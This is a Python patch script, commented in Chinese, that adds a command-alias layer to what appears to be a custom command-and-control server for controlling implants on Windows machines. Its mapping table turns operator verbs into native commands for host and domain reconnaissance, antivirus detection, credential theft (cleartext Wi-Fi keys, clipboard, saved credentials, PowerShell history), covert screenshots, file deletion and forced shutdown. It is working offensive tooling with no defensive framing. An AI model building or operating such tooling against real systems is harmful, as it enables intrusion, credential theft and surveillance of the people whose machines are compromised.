#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
patch_cmds.py  --  给服务端加完整命令别名层

设计取舍: 绝大多数 C2 命令本质是 shell 命令的组合, 放在服务端映射
比在植入体里逐个用 C 实现要高效得多 —— 立即生效, 不需要重新编译和
重新投放植入体。真正需要运行时代码的 screenshot 也可以用 PowerShell
借助 .NET 完成, 结果落到文件后由 download 取回。

植入体因此保持零改动。
"""
import ast
import io

SRV = r"D:\cobalt_strike_4.7\cs_dev\c2\server.py"

ALIAS = r'''
# ---------------------------------------------------------------- 命令别名层
# 把 C2 风格的命令映射为 Windows 原生命令。未命中的原样交给 cmd.exe。
_SCREENSHOT_PS = (
    'powershell -c "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;'
    '$s=[Windows.Forms.SystemInformation]::VirtualScreen;'
    '$b=New-Object Drawing.Bitmap $s.Width,$s.Height;'
    '$g=[Drawing.Graphics]::FromImage($b);'
    '$g.CopyFromScreen($s.Left,$s.Top,0,0,$b.Size);'
    '$p=$env:TEMP+\'\\_\'+[guid]::NewGuid().ToString(\'N\').Substring(0,8)+\'.png\';'
    '$b.Save($p);Write-Output $p"'
)

_NATIVE_PREFIX = ("ps", "download ", "upload ", "exit")


def map_command(cmd: str) -> str:
    c = cmd.strip()
    if not c:
        return c
    low = c.lower()

    # 原生命令直接透传 (由植入体处理)
    for p in _NATIVE_PREFIX:
        if low == p.strip() or low.startswith(p):
            return c

    parts = c.split(None, 1)
    verb = parts[0].lower()
    rest = parts[1] if len(parts) > 1 else ""
    q = '"%s"' % rest if rest else ""

    T = {
        # ---- 文件与目录 ----
        "pwd":      lambda: "cd",
        "ls":       lambda: ("dir /a " + q) if rest else "dir /a",
        "ll":       lambda: ("dir /a " + q) if rest else "dir /a",
        "cat":      lambda: "type " + q,
        "type":     lambda: "type " + q,
        "head":     lambda: "powershell -c \"Get-Content %s -TotalCount 20\"" % ("'%s'" % rest if rest else "''"),
        "tail":     lambda: "powershell -c \"Get-Content %s -Tail 20\"" % ("'%s'" % rest if rest else "''"),
        "rm":       lambda: "del /f /q " + q,
        "cp":       lambda: 'copy /y "%s"' % rest.replace(" ", '" "', 1),
        "mv":       lambda: 'move /y "%s"' % rest.replace(" ", '" "', 1),
        "mkdir":    lambda: "mkdir " + q,
        "rmdir":    lambda: "rmdir /s /q " + q,
        "find":     lambda: 'dir /s /b ' + q,
        "search":   lambda: 'findstr /s /i /m "%s" *' % rest,
        "hash":     lambda: 'certutil -hashfile %s SHA256' % q,
        # ---- 进程与服务 ----
        "kill":     lambda: "taskkill /F /PID " + rest,
        "tasklist": lambda: "tasklist /v",
        "services": lambda: "sc query type= service state= all",
        "drivers":  lambda: "driverquery /v",
        # ---- 系统信息 ----
        "whoami":   lambda: "whoami /all",
        "sysinfo":  lambda: "systeminfo",
        "env":      lambda: "set",
        "date":     lambda: "date /t & time /t",
        "uptime":   lambda: "net statistics workstation | findstr /i since",
        "drives":   lambda: "wmic logicaldisk get name,size,freespace,caption",
        "hotfix":   lambda: "wmic qfe get hotfixid,installedon",
        "av":       lambda: 'wmic /namespace:\\\\root\\\\SecurityCenter2 path AntiVirusProduct get displayName,productState',
        # ---- 网络 ----
        "ipconfig": lambda: "ipconfig /all",
        "ifconfig": lambda: "ipconfig /all",
        "netstat":  lambda: "netstat -ano",
        "arp":      lambda: "arp -a",
        "route":    lambda: "route print",
        "dns":      lambda: "ipconfig /displaydns",
        "ping":     lambda: "ping -n 4 " + rest,
        "tracert":  lambda: "tracert -h 5 " + rest,
        "firewall": lambda: "netsh advfirewall show allprofiles",
        # ---- 账户与域 ----
        "users":    lambda: "net user",
        "groups":   lambda: "net localgroup",
        "shares":   lambda: "net share",
        "sessions": lambda: "net session",
        "domains":  lambda: "net view /domain",
        "dc":       lambda: "nltest /dclist:",
        "trust":    lambda: "nltest /domain_trusts",
        # ---- 凭据与窃取 ----
        "wifi":     lambda: "netsh wlan show profiles",
        "wifikey":  lambda: 'netsh wlan show profile "%s" key=clear' % rest,
        "clip":     lambda: "powershell -c Get-Clipboard",
        "savedcred": lambda: "cmdkey /list",
        "history":  lambda: "powershell -c \"Get-Content (Get-PSReadlineOption).HistorySavePath\"",
        # ---- 操作 ----
        "screenshot": lambda: _SCREENSHOT_PS,
        "clipset":  lambda: "powershell -c \"Set-Clipboard '%s'\"" % rest,
        "msg":      lambda: "msg * " + rest,
        "download": lambda: "download " + rest,
        "shell":    lambda: rest,
        # ---- 会话 ----
        "sleep":    lambda: "sleep " + rest,
        "exit":     lambda: "exit",
        "clear":    lambda: "cls",
        # ---- 电源 ----
        "shutdown": lambda: "shutdown /s /t 0",
        "reboot":   lambda: "shutdown /r /t 0",
        "logoff":   lambda: "shutdown /l",
        "lock":     lambda: "rundll32 user32.dll,LockWorkStation",
    }

    if verb in T:
        try:
            return T[verb]()
        except Exception:
            return c
    return c


'''

src = io.open(SRV, encoding="utf-8").read()
if "def map_command" not in src:
    src = src.replace("class Session:", ALIAS + "\nclass Session:", 1)

# 接入 /api/command
if "s.pending = map_command(cmd)" not in src:
    src = src.replace("                s.pending = cmd\n",
                      "                s.pending = map_command(cmd)\n")

io.open(SRV, "w", encoding="utf-8", newline="\n").write(src)
ast.parse(src)

print("服务端语法: 通过")
print("  map_command 已定义 :", "def map_command" in src)
print("  已接入 /api/command:", "s.pending = map_command(cmd)" in src)

# 统计可用命令
import re
verbs = re.findall(r'^\s*"([a-z0-9]+)":\s*lambda', ALIAS, re.M)
natives = ["ps", "download", "upload", "exit"]
print()
print("可用命令 %d 个 (别名 %d + 原生 %d):" % (len(verbs) + len(natives), len(verbs), len(natives)))
line = "  "
for v in sorted(set(verbs + natives)):
    if len(line) + len(v) > 74:
        print(line)
        line = "  "
    line += v + "  "
if line.strip():
    print(line)
